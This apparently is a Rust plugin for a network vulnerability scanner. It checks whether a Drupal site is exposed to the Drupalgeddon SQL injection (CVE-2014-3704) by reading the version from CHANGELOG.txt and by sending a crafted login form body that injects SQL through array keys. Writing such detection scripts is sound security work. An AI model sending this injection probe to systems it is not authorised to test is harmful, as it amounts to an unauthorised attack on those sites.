/* http-vuln-cve2014-3704 - Drupalgeddon SQL-injection/version probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let resp = http_request(ctx, "GET", "/CHANGELOG.txt", None, "", "", None, 8192)
        .unwrap_or_default();
    if !resp.is_empty() {
        let body = http_body(&resp);
        if let Some(p) = body.find("Drupal ") {
            let rest = &body[p + 7..];
            let mut it = rest.split(|c: char| !(c.is_ascii_digit() || c == '.'));
            let ver = it.find(|s| !s.is_empty()).unwrap_or("");
            let mut parts = ver.split('.');
            let major: i32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
            let minor: i32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
            if major == 7 && minor < 32 {
                set_out(ctx, &format!("VULNERABLE: Drupal {}.{} (CVE-2014-3704 Drupalgeddon)", major, minor));
                return 0;
            }
        }
    }
    let body = "name[0 or 1]=test&name[1]=test&form_id=user_login&op=Log+in";
    let resp = http_request(ctx, "POST", "/?q=node&destination=node", None, "",
                            body, Some("application/x-www-form-urlencoded"), 8192)
        .unwrap_or_default();
    if !resp.is_empty() {
        let b = http_body(&resp);
        if http_status(&resp) == 500 && (b.contains("PDOException") || b.contains("DatabaseException")) {
            set_out(ctx, "VULNERABLE: Drupal CVE-2014-3704 SQL injection signature");
            return 0;
        }
        if b.contains("Drupal") {
            set_out(ctx, "Drupal detected; CVE-2014-3704 not confirmed");
            return 0;
        }
    }
    set_out(ctx, "not vulnerable: Drupal CVE-2014-3704 not confirmed");
    0
}
